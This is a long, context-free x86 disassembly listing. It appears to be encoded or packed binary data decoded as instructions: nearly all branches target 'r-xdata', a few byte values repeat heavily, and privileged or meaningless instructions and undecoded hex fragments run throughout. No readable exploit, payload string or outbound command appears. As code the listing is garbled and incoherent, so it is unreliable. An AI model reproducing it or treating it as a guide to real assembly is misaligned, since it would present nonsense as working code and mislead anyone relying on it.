and cl [ ebx ]
push ecx
in eax 0xe2
adc [ 0x2267bb1d ] bl
sbb eax 0x4c0a721d
jb r-xdata
loop r-xdata
sbb eax 0xe288ee97
sbb eax 0xe2e26272
loop r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x72727221
sbb eax 0xb76f721d
jb r-xdata
jb r-xdata
push cs
scasd [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x1ea71d1d
jb r-xdata
int 0xf0
loop r-xdata
and ch ch
dec esp
fcomp [ 0xa721d1d ]
jb r-xdata
imul esp [ 0x1d028b0b ] 0x7272721d
jb r-xdata
jb r-xdata
push cs
arpl [ esi ] cx
mov dh 0xeb
jb r-xdata
adc esp [ esi + 0x30 ]
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0xb8688ba ] bh
stosb [ edi ]
out 0xe2 eax
loop r-xdata
push ds
loop r-xdata
in eax dx
jne r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
in al dx
fwait
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
mov ebx 0x84e2e2b2
jb r-xdata
sbb eax 0xe6a46b1d
or dl [ esi - 0x75e2e2c9 ]
and [ ebp + 0x45 ] 0xd4
mov ch 0x6b
push edx
loop r-xdata
imul ebx [ esi + 0xab4f6c6 ] 0xffffffd9
imul esp [ esi + 0x1d37960a ] 0x1d
mov al [ edx - 0x4a2bba9b ]
imul esp [ edx + edx * 2 - 0x1e ] 0xffffffe2
or ch [ edi + 0x6f ]
jb r-xdata
mov ah 0xf6
or edx [ ecx + edx + 0xb721d1d ]
xor eax 0xffffffe2
loop r-xdata
loop r-xdata
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
jb r-xdata
jb r-xdata
jb r-xdata
sti
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
outsd
sbb bl [ edi ]
sbb eax 0xf5e20a1d
cmpsd [ esi ] [ edi ]
and dh [ edx + 0x1fbe676f ]
sbb eax 0x971db21d
0xb236a76f 0x9b0b
cli
jb r-xdata
imul esp esi 0xffffffc6
sbb ah [ edi + 0x1d ]
in eax dx
loop r-xdata
shl [ edx ] 0x1
mov cl 0xb
mov al [ 0xffffffffd1e2e2f8 ]
popad
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
fwait
cmc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x100bba88
retn 0xe2e2
jb r-xdata
sbb eax 0x751db21d
outsd
mov dh 0x19
push ds
mov bl 0xb
and dh [ edx - 0x50901f78 ]
in al dx
sbb eax 0x480b1ea7
loopne r-xdata
fldenv [ ecx ]
in eax dx
or edx [ edx ]
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov cl 0xb4
mov ch [ ebx - 0x3f ]
jb r-xdata
xor ch ch
jb r-xdata
jb r-xdata
jb r-xdata
and esp eax
mov ch 0x69
sbb [ ecx + 0x18 ] ah
iretd
or al 0x29
sbb eax 0x7272721d
popad
xor al [ ebx + ebp * 2 - 0x7747a749 ]
xchg [ ebx + ebp * 2 - 0x7747a149 ] al
add [ ebx + ebp * 2 - 0x7747a349 ] 0x8d
test [ ebx - 0x49 ] ch
sbb eax 0x7272721d
fstp [ ecx ]
in eax dx
cmpsd [ esi ] [ edi ]
adc cl [ eax + 0xb216990 ]
and [ esi ] bl
loop r-xdata
or cl bl
push es
sbb eax 0xed21d91d
push 0xe2ec
jne r-xdata
jb r-xdata
sub [ 0x25000b1d ] bl
or bl cl
outsd
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fldenv [ ecx ]
in eax dx
jb r-xdata
0xbf2a769 0xe19d
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sbb eax 0xea76f1d
jb r-xdata
shr [ esi ] cl
sub ecx [ ebx ]
jb r-xdata
jb r-xdata
sbb eax 0x971d1e97
push es
sbb eax 0xe28afeb5
outsd
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ esi + 0x721d1d01 ]
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
mov edx 0x1d3e360b
or edx eax
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf2a1691d
and ch ch
mov si 0xe2ff
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
shl [ edx ] 0x1
or edx [ ecx - 0x1b ]
loop r-xdata
loop r-xdata
mov bh 0x69
cli
or edi [ esp + ebp * 8 + 0x751de2e2 ]
inc esi
loop r-xdata
sbb eax 0x971db272
jb r-xdata
loop r-xdata
imul esp [ edi - 0x115096e2 ] 0x1d160f0b
mov edx 0xe2c2100b
loop r-xdata
jb r-xdata
push cs
jb r-xdata
xchg esp eax
jb r-xdata
push ds
imul edi [ edi - 0x7bc62ee2 ] 0x6b
mov edi 0xd1ac0b1c
loop r-xdata
ror [ ebx ] 0xe2
jb r-xdata
jb r-xdata
popad
sbb bh cl
or esi [ ebx + 0x5 ]
sbb eax 0x88ba721d
xchg [ ecx + 0x12a76b84 ] edi
or ecx [ ecx + 0x1d1d1d2a ]
cmc
or edi [ eax + 0x721d1d5f ]
jb r-xdata
mov [ ebx + 0x6a76b84 ] ch
jb r-xdata
jb r-xdata
mov cl 0x61
mov [ eax + 0x200b2169 ] dl
sbb eax 0x8788ba72
mov ecx 0x12a76b84
adc al 0xd9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x1bd5f4e2 ] 0xffffffe2
stosb [ edi ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
outsd
jb r-xdata
or [ ebx ] 0x79
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push ds
sbb eax 0xb51d0697
dec [ edx - 0x1d1d9d1e ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
ror ah 0x1
loop r-xdata
jb r-xdata
jb r-xdata
mov [ 0x1d1e9f6b ] bl
or esi [ ecx + 0x72e2e2ff ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
outsd
push cs
mov ch 0x88
out 0x8a al
shr [ ebx ] 0x1
or ecx [ edx - 0x7 ]
loop r-xdata
scasd [ edi ]
0x1d01b00b 0x721d
and eax 0x918e1ea7
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] 0x72721d1d
mov [ ebp - 0x1d0c1cf5 ] cl
jb r-xdata
or eax 0x72721d1d
jb r-xdata
or edi edx
jb r-xdata
sbb eax 0x1db2721d
sar [ edx - 0x63f43878 ] 0x1e
sbb cl [ ebx ]
jb r-xdata
adc dl al
jb r-xdata
loop r-xdata
sbb eax 0xb4727272
jb r-xdata
jb r-xdata
loopne r-xdata
loop r-xdata
imul ecx [ esi ] 0xebb60e63
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
push es
test [ ebx - 0x59 ] ch
jb r-xdata
sbb cl cl
jb r-xdata
or ecx [ edi + ecx + 0x72721d1d ]
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
fcom [ esi ]
sbb eax 0xd5da8a1d
mov dl ah
test [ 0x321d1ba7 ] ah
cmpsd [ esi ] [ edi ]
adc ecx [ eax + 0x25e288e2 ]
or ecx [ ecx + 0x72e2e2e9 ]
jb r-xdata
sbb eax 0xdcd5da8a
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
sub ecx [ bp + di ]
movsb [ edi ] [ esi ]
jb r-xdata
push cs
test [ ebx - 0x59 ] ch
add [ ebx ] cl
mov cl 0xe7
loop r-xdata
cmp eax 0x72721d1d
jb r-xdata
jns r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
sahf
jb r-xdata
jb r-xdata
loop r-xdata
and ah [ esi - 0x1e ]
imul esp [ edi + 0xaa76b1a ] 0x1d1ab20b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
out 0x6b al
cmpsb [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
scasd [ edi ]
push ss
loope r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
lea ecx [ ebx ]
jecxz r-xdata
sbb [ 0xb94881d ] bl
mov edi 0x72e2e2f4
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0x1d028b0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
outsb
pop ecx
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x72727272
imul esi [ edi - 0x6e7747c4 ] 0xffffff84
imul esi [ edi - 0x7bcc96fe ] 0x6b
mov bh 0x0
imul esp [ esi + ecx - 0x1e ] 0xffffffe2
sbb eax 0xb172721d
popad
jb r-xdata
sbb eax 0x25727272
jb r-xdata
loop r-xdata
jb r-xdata
fcmovbe st5
jb r-xdata
jb r-xdata
imul esp [ edi - 0x1e62f40e ] 0x7272e2e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
cld
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov ss [ ecx + 0x741de2c0 ]
jb r-xdata
or edi [ ecx + 0x3e ]
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
loop r-xdata
mul [ es : edi + 0x22 ]
or esi [ edx ]
adc eax 0x72721d1d
jb r-xdata
xchg ebp eax
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
or cl [ ebx ]
sbb ch [ ecx - 0x59 ]
jb r-xdata
0xe2e2
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mul [ ebx - 0x12115027 ]
pushad
adc al 0xfb
int3
mov dh ah
imul esp [ esi - 0x1d75353a ] 0xffffffd2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb ch [ edi - 0x51 ]
add dh [ ebx + 0x691e921d ]
shl dl 0x1d
xchg ecx eax
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
or esp [ eax - 0x2e1d1d08 ]
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah cl
adc cl [ esi ]
jb r-xdata
test [ ebx - 0x51 ] ch
sbb bh [ ebx + 0x18af6b84 ]
mov [ eax + 0x1d1e6c0b ] al
sbb eax 0x72727272
jb r-xdata
xchg [ ebx + ebp * 2 - 0x7745f359 ] eax
mov [ ecx + 0x2a ] gs
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x64f4ff49 ]
aas
sbb eax 0x751d721d
dec edx
loop r-xdata
push 0xe654edf3
in al dx
jb r-xdata
mov edx 0x6b84ab88
lahf
sbb cl [ ebx ]
neg [ ecx + 0x1d ]
and cl [ ebx ]
pop ss
jecxz r-xdata
mul [ edi + 0x22 ]
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
and ebp ebp
jb r-xdata
and [ ebx ] ecx
rcl [ ecx + ebx * 8 ] 0x1
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ eax + 0x721d1d2a ]
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
or eax 0x72e2e2f0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
dec ebx
retn 0xe2e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi esp 0x3d
sbb eax 0xc7510b1d
loop r-xdata
jb r-xdata
adc al 0xd
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x72e2e2ca ]
loop r-xdata
jb r-xdata
into
xchg bp ax
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push ds
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
push es
jb r-xdata
jb r-xdata
lahf
push ds
in eax dx
popf
add [ 0xffffffffe688b51d ] ebx
outsd
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
loope r-xdata
mov eax [ 0x721d1d3d ]
jb r-xdata
loop r-xdata
jb r-xdata
je r-xdata
sbb eax 0x1d1e9f6b
jb r-xdata
jb r-xdata
mov ch bh
or [ ecx + 0x2a ] ch
test [ ebx - 0x51 ] ch
mov dl al
test [ ebx - 0x51 ] ch
or bh [ ebx - 0x50947b50 ]
jb r-xdata
sbb eax 0x7272212b
jb r-xdata
or dl [ edi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x737745f4 ] 0x69
sub cl [ ebx ]
dec eax
pop esp
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
push esp
in eax dx
push esp
jb r-xdata
or ebx [ ebx + 0x721d1d3f ]
sbb eax 0xe2e24a75
mov [ ecx + 0x2b76b84 ] dl
imul esi [ ebx ] 0xb76b84
loop r-xdata
and ch ch
jb r-xdata
jb r-xdata
jge r-xdata
sbb ebp ebp
fldenv [ ecx ]
jb r-xdata
loop r-xdata
mov ah 0xea
mov [ esi - 0x5990e22f ] ah
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edx + 0x2aa00be6 ] 0x72721d1d
jb r-xdata
pop ecx
sub [ 0x7272721d ] bl
jb r-xdata
sub ecx [ ebx ]
loop r-xdata
jb r-xdata
cmp ah [ edi + 0x39 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e25a74
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bl bl
jb r-xdata
mov dl 0x88
loop r-xdata
jb r-xdata
or esi [ esi ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ edx + 0x721d1d1a ]
jb r-xdata
imul esp [ edi + 0x1aa76906 ] 0x6b
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0xa66fbb1d
jb r-xdata
or al 0xba
jb r-xdata
and eax 0x1d0466ed
sbb eax 0x67bcbd1d
leave
test [ ebx - 0x49 ] ch
cmp al 0xb8
out 0xec al
jb r-xdata
0x1d1e971d 0x697
jb r-xdata
jb r-xdata
or ebx eax
jb r-xdata
0x1dd1a688 0xa66f
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or bl cl
pop ebx
sbb eax 0xee26611d
sbb eax 0xe2e24a75
jb r-xdata
push ss
mov bl dl
jb r-xdata
pop edx
test [ 0x67bb1d1d ] dh
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ ebx ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and cl [ eax - 0x58947b34 ]
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edx + eax * 4 + 0x1d3e790b ] 0x1d
jb r-xdata
jb r-xdata
push ds
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
popad
clc
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn 0x6b84
pop esp
sbb al 0x1d
sbb eax 0x72727272
jb r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
adc ebp ebp
jb r-xdata
sbb bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
imul esp [ edi + 0x1ab20b0a ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
mov ebx 0x3caf6b84
or edx [ esi + 0x39 ]
sbb eax 0x7272721d
mov ebx 0x6b84cc88
scasd [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0xc6a66fbb
fimul [ ebx ]
retn
jb r-xdata
mov [ ecx + ebp * 2 + 0x5c480b2a ] cl
in eax dx
xchg edi eax
push ds
jb r-xdata
jb r-xdata
adc eax 0x72721d1d
jb r-xdata
aad 0xdc
jb r-xdata
jb r-xdata
in al dx
jb r-xdata
push cs
loop r-xdata
imul esp [ edx + ebx * 4 + 0x1d36e50a ] 0x1d
cdq
cld
aaa
mov ch 0x6b
stosd [ edi ]
imul esi [ ecx ] 0xa46bb57c
or ah ch
cmp bl [ 0xffffffffa226611d ]
mov bl [ edx + eax * 4 ]
imul esp [ edi + 0x8330b1a ] 0x72721d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ edx ] dl
jb r-xdata
jb r-xdata
jb r-xdata
adc bl [ 0x7272721d ]
imul edi [ edx ] 0x300b3967
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
jb r-xdata
in eax dx
mov ch 0x6b
jb r-xdata
mov bl 0x1d
xchg edx eax
0xbeaafe1 0x1b0
cmpsd [ esi ] [ edi ]
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
enter 0x3d69 0x84
loop r-xdata
js r-xdata
mov [ esp + eax * 4 + 0x69fea76b ] cl
and [ ebx ] cl
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
or esp [ ecx + 0x721d1d3d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb2069fe ] 0xffffffa7
jb r-xdata
out dx al
mov cl 0x1d
mov ah 0xd6
or edi esi
lahf
jb r-xdata
jb r-xdata
or al 0x13
jb r-xdata
in eax dx
ja r-xdata
imul ecx [ esi ] 0x88ee0e61
jb r-xdata
imul esp [ edi - 0x24dd2ee2 ] 0xffffffa7
push cs
xchg ebx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sti
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xdc0bb91a
jb r-xdata
loop r-xdata
or esi [ edx + eax * 8 ]
jb r-xdata
outsd
cmpsb [ esi ] [ edi ]
jb r-xdata
sbb eax 0xb51d0697
jb r-xdata
loop r-xdata
sbb eax 0x88ba7272
sbb eax 0xa688eab4
rcr [ 0xffffffffaec6a66f ] 0x1
mov ch 0xb2
or ah dh
pop eax
sbb eax 0xa680b1d
out 0xb al
mov al [ 0x721d1d2a ]
sbb al 0x84
imul ebx [ edi - 0x7be22efe ] 0x6b
loop r-xdata
jb r-xdata
loop r-xdata
or [ edi ] 0xf6a46bb5
or dl [ esi + 0x668a1d1d ]
sbb eax 0x8aa22661
sbb al 0x82
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or ebx [ ebp + 0x72e2e2f4 ]
jb r-xdata
mov ecx 0x72727221
jb r-xdata
cmp [ bp + di ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6b774510 ] 0xffffff84
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
imul edx [ edx ] 0x66ed11d9
inc ebx
and ah dl
loop r-xdata
loop r-xdata
or edx [ ecx + 0x72721d1d ]
jb r-xdata
jb r-xdata
cmp [ ebx + ebp * 2 + 0x3d69c8bf ] eax
loop r-xdata
jb r-xdata
imul ebp edx 0xbeaafe1
mov al 0x1
sbb eax 0x7272721d
mov ch 0x1d
xchg edi eax
imul esp [ edi + 0x2af6f1a ] 0x1e921db3
sbb eax 0xd10a721d
adc bl [ 0x30fe8a1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x1a
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc al 0x88
mov [ esp + eax * 4 - 0x45e95895 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ esi ] ebx
and ah [ edx - 0x1d0743f5 ]
jb r-xdata
jb r-xdata
push es
sbb eax 0x1db1feb5
xchg edi eax
or bl [ 0xffffffffe2e27a75 ]
loop r-xdata
in eax dx
pop di
sbb eax 0xeebfdb1d
in eax dx
0x1d5f 0x691d
loop r-xdata
jb r-xdata
push ds
xchg [ ebx + ebp * 2 - 0x7745f559 ] eax
mov [ ebx + ebp * 2 + 0xbba08a7 ] es
lodsd [ esi ]
adc bl [ 0x7272721d ]
jb r-xdata
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
sub ecx [ ebx ]
jb r-xdata
or esi [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax 0xfb
loop r-xdata
mov ah 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax 0x72721d1d
jb r-xdata
jb r-xdata
or ah dl
sbb ebx [ 0xffffffffd912691d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
stosb [ edi ]
jb r-xdata
test [ ebx - 0x59 ] ch
movsd [ edi ] [ esi ]
jb r-xdata
mov [ ebx + ebp * 2 + 0x2069fea7 ] es
or esp [ edi + 0x72e2e2fc ]
jb r-xdata
or eax ebx
and [ 0x7272721d ] ebx
jb r-xdata
mov dl 0x84
imul esp [ ebp - 0x591e7b20 ] 0x55edfec6
and dh [ edx - 0x23f5db97 ]
daa
sbb eax 0xee26611d
push ss
in eax dx
pushad
adc eax 0x6f1d1d03
cmpsd [ esi ] [ edi ]
add dh [ edx + 0x1db6941d ]
mov edi 0xba66edee
loop r-xdata
loop r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov eax [ 0xffffffffe165e669 ]
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax [ eax - 0x36 ]
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
push cs
movlps [ 0x7272721d ] xmm3
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
and al ah
test [ ecx - 0x22 ] ah
loop r-xdata
0xe2e68f0b 0x72e2
imul esp [ edx - 0x1ee41e06 ] 0x6b13e13b
mov dl al
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
imul edi [ edi - 0x23f446e6 ] 0xffffffc6
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop esi
rcl [ edx ] 0x1
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
std
mov dl ch
jb r-xdata
jb r-xdata
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ eax ] 0xe2fca70b
loop r-xdata
jb r-xdata
cdq
jb r-xdata
mov ah cl
shl [ edx ] 0x1
jb r-xdata
mov bh 0x2a
test [ ebx - 0x49 ] ch
adc [ eax + 0x6b848e88 ] bh
in eax dx
imul ecx [ esi ] 0xd1b5b3b3
sbb eax 0x1d28360b
sbb eax 0x72727272
jb r-xdata
imul esp [ esi + 0x2267fac6 ] 0xffffffed
out dx al
and ax 0x1d5a
sbb eax 0xe2ea9d61
xchg edi eax
sbb eax 0x25690e97
or ebp [ edx + 0x72e2e2f2 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
pop ss
mov dl ah
fcom [ 0x72721d1d ]
jb r-xdata
or cl [ edx ]
jb r-xdata
sbb cl cl
adc dh [ edi ]
jb r-xdata
out 0x65 al
jb r-xdata
inc esi
mov edi 0xb76b8442
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x721d1d38 0x7272
jb r-xdata
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
loope r-xdata
jb r-xdata
mov cl 0xb
not [ edi ]
sbb eax 0x7272721d
outsd
inc edx
pop ss
sbb eax 0xbb2b11d
retn 0xe2f7
jb r-xdata
sbb eax 0x7272721d
in eax dx
0xe2e2
popfd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
pop [ ebx + ebp * 2 - 0x77450759 ]
or edi edi
cli
loop r-xdata
test [ ebx - 0x59 ] ch
fistp [ ecx - 0x334cf436 ]
jb r-xdata
sbb bh [ ecx - 0x1d3923f5 ]
loop r-xdata
popad
jb r-xdata
sbb eax 0x30fe8a1d
jb r-xdata
or edi [ eax - 0x14 ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
fst [ ecx ]
jb r-xdata
in eax dx
cmpsd [ esi ] [ edi ]
jb r-xdata
or esp [ ecx + 0x3d ]
jb r-xdata
or esi [ ebx + 0x72e2e2cc ]
jb r-xdata
jb r-xdata
xor [ edx + 0x1d ] bl
sbb eax 0xc6c69e61
loop r-xdata
cli
and ch ch
imul ebp [ edx ] 0x1d27260a
sbb eax 0xe2ebda0b
loop r-xdata
mov dl 0xd9
mov dh 0xea
mov dl 0xed
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xba72721d
jb r-xdata
xor eax 0xee8a1d1d
jb r-xdata
jl r-xdata
jb r-xdata
sbb eax 0x39d11269
fst [ ecx ]
loop r-xdata
sbb eax 0x6c66ed1d
jb r-xdata
jb r-xdata
0x1d3ac20b 0x721d
loope r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
imul esp eax 0x7221e3c9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ edx + 0x1ea76b84 ] edi
loope r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
0xb30b
jb r-xdata
loop r-xdata
mov bh dh
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov ah 0x88
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
popad
jb r-xdata
int3
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push ss
jb r-xdata
sbb eax 0xe252741d
loop r-xdata
loop r-xdata
sbb eax 0x6bee2661
cmpsb [ esi ] [ edi ]
imul esp [ edi - 0x33774504 ] 0xffffffbc
mov [ edi - 0x3d58947c ] al
imul esp [ esp + eax * 4 ] 0xbc0a76b
loope r-xdata
jb r-xdata
and cl [ ebx ]
outsb
add ebx [ 0xffffffffdb72721d ]
cmpsd [ esi ] [ edi ]
or ecx [ eax + 0x5c ]
mov [ edi + 0xca76b84 ] al
mov edx 0x2a698c88
jb r-xdata
jb r-xdata
sbb eax 0x214dee8a
jb r-xdata
popad
push es
sbb ah [ ebx + 0xe ]
loop r-xdata
adc edx [ ebx ]
jb r-xdata
jb r-xdata
loopne r-xdata
in eax dx
insb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x710bceb4
aas
or cl [ ebx - 0x44e2e2cc ]
mov bh 0x46
jb r-xdata
jb r-xdata
jb r-xdata
imul esp esi 0xeaa7e165
or eax edx
cmp bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x48947bbe ] 0x46
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb22671a ] 0xffffff9a
jb r-xdata
xchg al ch
loop r-xdata
and ch ch
call [ bx + di ]
sbb eax 0xbabe881d
test [ ebx - 0x59 ] ch
jb r-xdata
or ecx [ edi ]
jb r-xdata
sbb ah [ edi + 0x22 ]
adc ebp [ ebx - 0x59 ]
jb r-xdata
loop r-xdata
mov bl 0xcc
jb r-xdata
xor [ esi + 0x6b ] bl
jb r-xdata
out dx al
sbb eax 0xd912691d
popad
jb r-xdata
or ebp ebp
or bl [ 0x7272721d ]
retn 0xff0b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or esp [ ebx + ecx ]
jb r-xdata
sbb eax 0x72727272
